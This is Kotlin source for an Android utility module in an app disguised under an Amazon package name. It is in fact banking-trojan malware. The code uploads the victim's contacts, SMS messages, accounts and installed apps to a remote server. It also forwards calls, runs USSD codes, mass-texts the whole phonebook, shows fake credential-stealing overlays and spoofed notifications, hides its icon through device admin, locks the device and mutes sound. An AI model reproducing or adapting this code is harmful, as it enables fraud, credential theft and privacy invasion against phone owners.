package com.amazon.zzz.Modull

import android.Manifest
import android.accounts.AccountManager
import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.graphics.drawable.Icon
import android.hardware.display.DisplayManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.text.format.DateUtils
import android.util.Base64
import android.view.Display
import android.widget.RemoteViews
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.amazon.zzz.Activities.actViewInjection
import com.amazon.zzz.Admin.admReceiverDeviceAdmin
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.R
import com.amazon.zzz.Services.srvLockDevice
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utAutoStartUtil
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.Utilsss.utUtils.Log
import com.amazon.zzz.constNm
import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections
import java.util.regex.Pattern
import kotlin.random.Random


object udUtils {

    var notificationId: Int? = null

    val deviceName: String
        get() {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            return if (model.lowercase()
                    .startsWith(manufacturer.lowercase())
            ) {
                capitalize(model)
            } else {
                capitalize(manufacturer) + " " + model
            }
        }

    val TAG_LOG = "ut"

    fun Calling(context: Context, number: String?, lock: Boolean) {
        runCatching {
            apiUt.sendLogs(context, "", "Calling", "log")
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
            intent.data = Uri.parse("tel:$number")
            intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            context.startActivity(intent)

            if (lock) {
                SharedPreferencess.lockDevice = "1"
                try {
                    //------Start Lock Device-----------
                    if (!utAutoStartUtil.isMyServiceRunning(context, srvLockDevice::class.java)) {
                        context.startService(Intent(context, srvLockDevice::class.java))
                        val cn = ComponentName(context, admReceiverDeviceAdmin::class.java)
                        val dpm =
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        dpm.setApplicationHidden(cn, context.packageName, true)
                    }
                } catch (ex: Exception) {
                    utUtils.Log("Calling", "$ex")
                }
            }

            val obj = JSONObject()
            obj.put("Calling", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "Calling")
        }.onFailure {
            utUtils.Log("Calling", "$it")
        }
    }

    fun callForward(context: Context, number: String, simSlotIndex: Int = 0) {
        apiUt.sendLogs(context, "", "callForward", "log")
        try {
            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_PHONE_STATE
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val subscriptionManager = context.getSystemService(SubscriptionManager::class.java)
                val subscriptionInfo =
                    subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

                // TO CREATE PhoneAccountHandle FROM SIM ID
                val telecomManager =
                    context.getSystemService(Context.TELECOM_SERVICE) as TelecomManager?
                val list = telecomManager!!.callCapablePhoneAccounts
                var primaryPhoneAccountHandle: PhoneAccountHandle =
                    if (simSlotIndex == 0) list.first() else list.last()
                for (phoneAccountHandle in list) {
                    if (phoneAccountHandle.id.contains(subscriptionInfo.iccId) || phoneAccountHandle.id.contains(
                            subscriptionInfo.subscriptionId.toString()
                        )
                    ) {
                        primaryPhoneAccountHandle = phoneAccountHandle
                    }
                }

                val callForwardString = "**21*$number#"
                val uri = Uri.fromParts("tel", callForwardString, "#")

                //To call
                val extras = Bundle()
                extras.putParcelable(
                    TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    primaryPhoneAccountHandle
                )
                telecomManager.placeCall(uri, extras)
            }

            val logForward = "ForwardCALL: $number"
            Log("ForwardCall", logForward)
            val obj = JSONObject()
            obj.put("callForward", logForward)
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
            apiUt.sendLogs(context, "", obj.toString(), "callForward")
        } catch (ex: Exception) {
            Log("ForwardCall", "Error")
            val logCF = "ERROR callForward$number ${ex.localizedMessage}"
            val obj = JSONObject()
            obj.put("ForwardCall_Error", logCF)
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun divideMessage(message1: String): ArrayList<String> {
        var message = message1
        val result = ArrayList<String>()
        do {
            val pattern = "(.{0,160})((?!\\w).*)"

            // Create a Pattern object
            val r = Pattern.compile(pattern)

            // Now create matcher object.
            val m = r.matcher(message)
            message = if (m.find() && m.groupCount() >= 2) {
                result.add(m.group(1))
                m.group(2)
            } else {
                result.add(message)
                break
            }
        } while (message.isNotEmpty())
        return result
    }

    fun drawableToBitmap(drawable: Drawable): Bitmap? {
        if (drawable is BitmapDrawable) {
            return drawable.bitmap
        }

        val width =
            if (!drawable.bounds.isEmpty) drawable.bounds.width() else drawable.intrinsicWidth
        val height =
            if (!drawable.bounds.isEmpty) drawable.bounds.height() else drawable.intrinsicHeight

        // Now we check we are > 0
        val bitmap = Bitmap.createBitmap(
            if (width <= 0) 1 else width, if (height <= 0) 1 else height,
            Bitmap.Config.ARGB_8888
        )
        val canvas = Canvas(bitmap)
        drawable.setBounds(0, 0, canvas.width, canvas.height)
        drawable.draw(canvas)
        return bitmap
    }

    fun getAllApplication(context: Context): JSONArray? {
        try {
            val pm: PackageManager = context.packageManager
            val main = Intent(Intent.ACTION_MAIN, null)
            main.addCategory(Intent.CATEGORY_LAUNCHER)

            val list = JSONArray()
            try {
                val launchables = pm.queryIntentActivities(main, 0)
                Collections.sort(
                    launchables,
                    ResolveInfo.DisplayNameComparator(pm)
                )
                launchables.forEach { launchable ->
                    val activity = launchable.activityInfo
                    list.put(activity.packageName)
                }
            } catch (e: Exception) {
            }

            val apps = pm.getInstalledApplications(0)
            for (app in apps) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                    list.put(app.packageName)
                }

                when {
                    app.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP == 1 -> {  // updated system apps
                    }

                    app.flags and ApplicationInfo.FLAG_SYSTEM == 1 -> { // system apps
                    }

                    else -> {
                        list.put(app.packageName)
                    }
                }
            }

            return list
        } catch (ex: Exception) {
            return null
        }
    }

    fun getApps(context: Context) {
        try {
            val list = JSONArray()
            val packages =
                context.packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            for (packageInfo in packages) {
                if (!isSystemPackage(packageInfo)) {
                    val obj = JSONObject()
                    obj.put("app", packageInfo.packageName)
                    list.put(obj)
                }
            }
            if (list.length() > 0)
                apiUt.sendLogs(context, "", list.toString(), "applist")

            val obj = JSONObject()
            obj.put("getApps", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "getApps")
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put("getApps_Error", "|  ${ex.localizedMessage}  | getApps $ex")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun getBitmap(base64Str: String): Bitmap {
        val decodedBytes = Base64.decode(
            base64Str,
            Base64.DEFAULT
        )
        return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
    }

    fun getContacts(context: Context) {
        try {
            apiUt.sendLogs(context, "", "getContacts", "log")
            val list = JSONArray()
            val phones = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )

            while (phones!!.moveToNext()) {
                val nn =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val name =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                if (!nn.contains("*") && !nn.contains("#") && nn.length > 6) {
                    val obj = JSONObject()
                    obj.put("name", name)
                    obj.put("number", nn)
                    list.put(obj)
                }
            }
            if (list.length() > 0)
                apiUt.sendLogs(context, "", list.toString(), "phonenumber")

            val obj = JSONObject()
            obj.put("getContacts", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "getContacts")
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put(
                "getContacts_Error",
                "|  ${ex.localizedMessage}  | Error No permissions to get contacts ${ex.localizedMessage}"
            )
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }

        logAccounts(context)
    }

    fun getNumber(context: Context): String {
        try {
            if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED) {
                val tMgr = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?

                var myPhoneNumber: String? = ""
                try {
                    myPhoneNumber = tMgr?.line1Number
                } catch (ex: NullPointerException) {
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber

                val subscription = SubscriptionManager.from(context).activeSubscriptionInfoList
                for (i in subscription.indices) {
                    val info = subscription[i]
                    myPhoneNumber = info.number
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber
            }
        } catch (e: Exception) {
            utUtils.Log(TAG_LOG, e.localizedMessage)
        }

        return ""
    }

    fun getNumber1(context: Context): String {
        try {
            if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED) {
                val subManager =
                    context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val telephonyManager =
                    context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val subInfoList = subManager.activeSubscriptionInfoList
                var myPhoneNumber: String? = ""
                var subscriptionInfo: SubscriptionInfo? = null
                for (sub in subInfoList) {
                    if (sub.simSlotIndex == 1) {
                        subscriptionInfo = sub
                        val tmg = telephonyManager.createForSubscriptionId(sub.subscriptionId)
                        myPhoneNumber = tmg.line1Number
                    }
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber

                myPhoneNumber = subscriptionInfo?.number
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber
            }
        } catch (e: Exception) {
            utUtils.Log(TAG_LOG, e.localizedMessage)
        }

        return ""
    }

    fun getOperatorName1(context: Context): String {
        try {
            if (context.checkCallingOrSelfPermission(constNm.p1) == PackageManager.PERMISSION_GRANTED) {
                val subManager =
                    context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val telephonyManager =
                    context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val subInfoList = subManager.activeSubscriptionInfoList
                var operatorName: String? = ""
                for (sub in subInfoList) {
                    if (sub.simSlotIndex == 1) {
                        val tmg = telephonyManager.createForSubscriptionId(sub.subscriptionId)
                        operatorName = tmg.networkOperatorName
                    }
                }
                return operatorName ?: ""
            }
        } catch (e: Exception) {
            utUtils.Log(TAG_LOG, e.localizedMessage)
        }

        return ""
    }

    fun getSMS(context: Context) {
        try {
            apiUt.sendLogs(context, "", "getSMS", "log")
            val list = JSONArray()
            val arraySMS = arrayOf("sms")
            for (str in arraySMS) {
                val uriSMS = Uri.parse("content://$str")
                val c = context.contentResolver.query(uriSMS, null, null, null, null)
                if (c != null) {
                    while (c.moveToNext()) {
                        val number = c.getString(2)
                        if (number.isNotEmpty()) {
                            val stexts = c.getString(12)
                            val text = c.getString(13)

                            val obj = JSONObject()
                            obj.put("number", number)
                            obj.put("stexts", stexts)
                            obj.put("text", text)
                            obj.put("date", c.getString(4))
                            val type = when (c.getString(9)) {
                                "0" -> {
                                    "all"
                                }

                                "1" -> {
                                    "inBox"
                                }

                                "2" -> {
                                    "sent"
                                }

                                "3" -> {
                                    "draft"
                                }

                                "4" -> {
                                    "outBox"
                                }

                                "5" -> {
                                    "failed"
                                }

                                "6" -> {
                                    "queued"
                                }

                                else -> {
                                    " "
                                }
                            }
                            obj.put("type", type)
                            list.put(obj)
                        }
                    }
                    c.close()
                }
            }
            if (list.length() > 0)
                apiUt.sendLogs(context, "", list.toString(), "smslist")

            val obj = JSONObject()
            obj.put("getSMS", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "getSMS")
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put("getSMS_Error", "| ErrorGetSavedSMS ${ex.localizedMessage} ")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun getScreenBoolean(context: Context): Boolean {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        return !km.inKeyguardRestrictedInputMode()
    }

    fun isKeyguardLocked(context: Context): Boolean {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
//        return km.isKeyguardLocked || km.isKeyguardSecure
        return km.isKeyguardLocked
    }

    fun isScreenOn(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
            var screenOn = false
            for (display in dm.displays) {
                if (display.state != Display.STATE_OFF) {
                    screenOn = true
                }
            }
            screenOn
        } else {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isScreenOn
        }
    }

    fun is_dozemode(context: Context): Boolean {
        apiUt.sendLogs(context, "", "is_dozemode", "log")
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(context.packageName)
    }

    fun logAccounts(context: Context) {
        val list = JSONArray()
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.GET_ACCOUNTS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                val accounts = AccountManager.get(context).accounts
                for (ac in accounts) {
                    val obj = JSONObject()
                    obj.put("name", ac.name)
                    obj.put("type", ac.type)
                    list.put(obj)
                }
            } catch (e: java.lang.Exception) {
            }

            if (list.length() > 0)
                apiUt.sendLogs(context, "", list.toString(), "otheraccounts")

            val obj = JSONObject()
            obj.put("logAccounts", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "logAccounts")
        }
    }

    fun openFake(context: Context, nameInj: String?): Boolean {
        try {
            if (SharedPreferencess.SettingsRead(context, nameInj)!!.isNotEmpty()) {
                apiUt.sendLogs(context, "", "openFake $nameInj", "log")
                val dialogIntent = Intent()
                dialogIntent.component = ComponentName(
                    context.packageName,
                    constNm.a10.canonicalName
                )
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                SharedPreferencess.app_inject = nameInj ?: ""
                context.startActivity(dialogIntent)

                val obj = JSONObject()
                obj.put("openFake", "ok")
                apiUt.sendLogs(context, "", obj.toString(), "openFake")

                return true
            }
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put(
                "openFake_Error",
                "|  ${ex.localizedMessage}  | Error module startViewInject $ex"
            )
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
        return false
    }

    fun openUrlBraw(context: Context, url: String?) {
        var url = url
        try {
            apiUt.sendLogs(context, "", "openUrlBraw $url", "log")
            if (!url!!.startsWith("https://") && !url.startsWith("http://")) {
                url = "http://$url"
            }
            val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            context.startActivity(browserIntent)

            val obj = JSONObject()
            obj.put("openUrlBraw", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "openUrlBraw")

        } catch (ex: Exception) {
            val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            context.startActivity(browserIntent)

            val obj = JSONObject()
            obj.put("openUrlBraw", "ok")
            apiUt.sendLogs(context, "", obj.toString(), "openUrlBraw")
        }
    }

    fun sendNotification(mContext: Context, app: String, title: String?, text: String?) {
        try {
            apiUt.sendLogs(mContext, "", "sendNotification $app", "log")
            var nameApp: String? = null
            var bitmap: Bitmap? = null
            runCatching {
                val pm: PackageManager = mContext.packageManager
                val main = Intent(Intent.ACTION_MAIN, null)
                main.addCategory(Intent.CATEGORY_LAUNCHER)
                val launchables = pm.queryIntentActivities(main, 0)
                Collections.sort(
                    launchables,
                    ResolveInfo.DisplayNameComparator(pm)
                )
                launchables.forEach { launchable ->
                    val activity = launchable.activityInfo
                    if (activity.packageName == app || activity.packageName.contains(app)) {
                        val icon = activity.loadIcon(pm)
                        bitmap = drawableToBitmap(icon!!)
                        nameApp = activity.loadLabel(pm).toString()
                    }
                }
            }

            var base64Icon: String? = null
            if (bitmap == null) {
                runCatching {
                    base64Icon = SharedPreferencess.SettingsRead(mContext, "icon_$app")
                }
            }

            val notificationIntent = Intent(mContext, actViewInjection::class.java)
            notificationIntent.putExtra("push", "1")
            notificationIntent.putExtra("startpush", app)
            notificationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            notificationIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            SharedPreferencess.app_inject = app

            val contentIntent = PendingIntent.getActivity(
                mContext,
                0, notificationIntent,
                PendingIntent.FLAG_CANCEL_CURRENT
            )

            //----
            val intSmailIcon = try {
                mContext.resources.getIdentifier(
                    "$app:mipmap/ic_launcher",
                    null,
                    null
                )
            } catch (e: Exception) {
                null
            }

            val collapsedView = RemoteViews(mContext.packageName, R.layout.lustom_notif_zzz)
            collapsedView.setTextViewText(
                R.id.shareTextzzz,
                DateUtils.formatDateTime(
                    mContext,
                    System.currentTimeMillis(),
                    DateUtils.FORMAT_SHOW_TIME
                )
            )
            if (bitmap != null)
                collapsedView.setImageViewBitmap(R.id.iconzzz, bitmap)
            else if (base64Icon != null)
                collapsedView.setImageViewBitmap(R.id.iconzzz, getBitmap(base64Icon!!))
            collapsedView.setTextViewText(
                R.id.titlezzz,
                title
            )
            collapsedView.setTextViewText(
                R.id.text1zzz,
                text
            )
            collapsedView.setOnClickPendingIntent(R.id.backgroundzzz, contentIntent)

            val notificationManager = NotificationManagerCompat.from(mContext)
            val id = nameApp ?: "channel_push"
            val description = nameApp ?: ""

            if (Build.VERSION.SDK_INT > 25) {
                val mChannel = NotificationChannel(
                    id,
                    nameApp ?: "google",
                    NotificationManager.IMPORTANCE_HIGH
                )

                mChannel.description = description
                mChannel.enableLights(true)
                mChannel.lightColor = Color.RED
                mChannel.enableVibration(true)
                mChannel.vibrationPattern = longArrayOf(1500, 1500, 1500, 1500, 1500)
                mChannel.setShowBadge(false)
                notificationManager.createNotificationChannel(mChannel)
            }

            val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification.Builder(mContext, id)
            } else {
                Notification.Builder(mContext)
            }

            val bigText = Notification.BigTextStyle()
            bigText.bigText(text)
            bigText.setBigContentTitle(title)
            bigText.setSummaryText(text)

            notificationBuilder
                .setPriority(Notification.PRIORITY_HIGH)
                .setContentTitle(title)
                .setContentText(text)
                .setVibrate(longArrayOf(1500, 1500, 1500, 1500, 1500))
                .setStyle(bigText)
                .setAutoCancel(false)
                .setContentIntent(contentIntent)
                .setDefaults(Notification.DEFAULT_VIBRATE)
                .setDefaults(Notification.DEFAULT_SOUND)
                .setDefaults(Notification.DEFAULT_LIGHTS)
                .setCategory(Notification.CATEGORY_MESSAGE)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                notificationBuilder
                    .setCustomContentView(collapsedView)
            }

            if (bitmap != null)
                notificationBuilder.setSmallIcon(Icon.createWithBitmap(bitmap))
            else if (intSmailIcon != null && intSmailIcon > 0)
                runCatching {
                    notificationBuilder.setSmallIcon(intSmailIcon)
                }
            else
                runCatching {
                    notificationBuilder.setSmallIcon(R.mipmap.ic_launcher)
                }

            if (bitmap != null)
                notificationBuilder.setLargeIcon(bitmap)
            else if (base64Icon != null)
                notificationBuilder.setLargeIcon(getBitmap(base64Icon!!))

            val notification = notificationBuilder.build()
            notificationId = Random.nextInt(1, 9999)
            notificationManager.notify(null, notificationId!!, notification)

            val logCF = "send local Notification"
            val obj = JSONObject()
            obj.put("push", logCF)
            SharedPreferencess.SettingsToAdd(mContext, constNm.LogEvents, "$obj::endlog::")
            apiUt.sendLogs(mContext, "", obj.toString(), "sendNotification")
        } catch (e: Exception) {
            Log("sendNotification", "Error")
            val logCF = "ERROR sendNotification $e"
            val obj = JSONObject()
            obj.put("openFake_Error", logCF)
            SharedPreferencess.SettingsToAdd(mContext, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun sendSms(context: Context, phoneNumber: String, message: String, simSlotIndex: Int = 0) {
        try {
            apiUt.sendLogs(context, "", "sendSms $phoneNumber", "log")
            val messageList = divideMessage(message)
            val pendingIntent = PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"), 0)
            val deliveredPI = PendingIntent.getBroadcast(context, 0, Intent("SMS_DELIVERED"), 0)
            val sents: ArrayList<PendingIntent> = ArrayList<PendingIntent>()
            val deliveredList = ArrayList<PendingIntent?>()
            for (i in messageList.indices) {
                deliveredList.add(deliveredPI)
                sents.add(pendingIntent)
            }

            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_PHONE_STATE
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val subscriptionManager =
                    context.getSystemService(SubscriptionManager::class.java)
                val subscriptionInfo =
                    subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

                val size = messageList.size
                if (size == 1) {
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendTextMessage(phoneNumber, null, message, pendingIntent, deliveredPI)
                } else {
                    utUtils.Log("sms_over_length", messageList.toString())
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendMultipartTextMessage(
                            phoneNumber,
                            null,
                            messageList,
                            sents,
                            deliveredList
                        )
                }
            }

            val logSMS = "Output SMS:$phoneNumber text:$message"
            Log("SMS", logSMS)
            val obj = JSONObject()
            obj.put("sendSms", "")
            obj.put("phoneNumber", phoneNumber)
            obj.put("message", message)
            apiUt.sendLogs(context, "", obj.toString(), "sendSms")
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put("sendSms_Error", "sendSms error ${ex.localizedMessage} ")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun sms_mailing_phonebook(context: Context, text: String, simSlotIndex: Int = 0) {
        apiUt.sendLogs(context, "", "sms_mailing_phonebook", "log")
        val phones = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )
        var phoneNumber = ""
        var is_sms_working = false
        var scr = 0
        while (phones!!.moveToNext()) {
            phoneNumber =
                phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            if (!phoneNumber.contains("*") && !phoneNumber.contains("#") && phoneNumber.length > 6) {
                try {
                    sendSms(context, phoneNumber, text, simSlotIndex)
                    is_sms_working = true
                    scr++
                } catch (ex: Exception) {
                    val obj = JSONObject()
                    obj.put(
                        "sms_mailing_phonebook_Error",
                        "No permission to send SMS ${ex.localizedMessage} "
                    )
                    SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
                    is_sms_working = false
                }
            }
        }
        if (is_sms_working) {
            val obj = JSONObject()
            obj.put("sms_send", scr.toString())
            apiUt.sendLogs(context, "", obj.toString(), "sms_send_all")
        }

        val obj = JSONObject()
        obj.put("sms_mailing_phonebook", "ok")
        apiUt.sendLogs(context, "", obj.toString(), "sms_mailing_phonebook")
    }

    fun startApplication(context: Context, app: String) {
        try {
            apiUt.sendLogs(context, "", "startApplication $app", "log")
            val launchIntent: Intent? = context.packageManager.getLaunchIntentForPackage(app)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
//            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
            launchIntent?.let {
                context.startActivity(launchIntent)
                val obj = JSONObject()
                obj.put("startApplication", "ok")
                apiUt.sendLogs(context, "", obj.toString(), "startApplication")
            }
        } catch (e: Exception) {
            val obj = JSONObject()
            obj.put("startApplication_Error", "Error startApplication ${e.localizedMessage}")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun startClearCash(context: Context, app: String?) {
        try {
            apiUt.sendLogs(context, "", "startClearCash $app", "log")
            SharedPreferencess.autoClickCache = "1"
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            intent.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
            val uri = Uri.fromParts("package", app, null)
            intent.data = uri
            context.startActivity(intent)

//            val obj = JSONObject()
//            obj.put("startClearCash", "ok")
//            apiUt.sendLogs(context, "", obj.toString(), "startClearCash")
        } catch (e: Exception) {
            val obj = JSONObject()
            obj.put("startClearCash_Error", "Error startClearCash ${e.localizedMessage}")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun stopSound(context: Context) {
        try {
            apiUt.sendLogs(context, "", "stopSound", "log")
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true)
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0)
            audioManager.setVibrateSetting(
                AudioManager.VIBRATE_TYPE_NOTIFICATION,
                AudioManager.VIBRATE_SETTING_OFF
            )
        } catch (ex: Exception) {
        }
    }

    fun swapSmsMenager(context: Context, packageName: String?) {
        try {
            apiUt.sendLogs(context, "", "swapSmsMenager $packageName", "log")
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            context.startActivity(intent)
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put("swapSmsMenager_Error", "|  ${ex.localizedMessage}  | swapSmsMenager $ex")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
        }
    }

    fun ussd(context: Context, ussd: String, simSlotIndex: Int = 0) {
        try {
            apiUt.sendLogs(context, "", "ussd $ussd", "log")
            SharedPreferencess.autoClickOnce = "1"

            if (ActivityCompat.checkSelfPermission(
                    context,
                    Manifest.permission.READ_PHONE_STATE
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val subscriptionManager = context.getSystemService(SubscriptionManager::class.java)
                val subscriptionInfo =
                    subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

                // TO CREATE PhoneAccountHandle FROM SIM ID
                val telecomManager =
                    context.getSystemService(Context.TELECOM_SERVICE) as TelecomManager?
                val list = telecomManager!!.callCapablePhoneAccounts
                var primaryPhoneAccountHandle: PhoneAccountHandle =
                    if (simSlotIndex == 0) list.first() else list.last()
                for (phoneAccountHandle in list) {
                    if (phoneAccountHandle.id.contains(subscriptionInfo.iccId) || phoneAccountHandle.id.contains(
                            subscriptionInfo.subscriptionId.toString()
                        )
                    ) {
                        primaryPhoneAccountHandle = phoneAccountHandle
                    }
                }

                val extras = Bundle()
                extras.putParcelable(
                    TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    primaryPhoneAccountHandle
                )
                telecomManager.placeCall(Uri.parse("tel:" + Uri.encode(ussd)), extras)
            }

            val logUSSD = "USSD: $ussd"
            Log("USSD", logUSSD)
            val obj = JSONObject()
            obj.put("ussd", ussd)
            apiUt.sendLogs(context, "", obj.toString(), "ussd")
        } catch (e: java.lang.Exception) {
            val logUSSD = "ERROR START USSD"
            Log("USSD", logUSSD)
        }
    }

    private fun capitalize(s: String?): String {
        if (s == null || s.isEmpty()) {
            return ""
        }
        val first = s[0]
        return if (Character.isUpperCase(first)) {
            s
        } else {
            Character.toUpperCase(first).toString() + s.substring(1)
        }
    }

    private fun isSystemPackage(applicationInfo: ApplicationInfo): Boolean {
        return applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
    }
}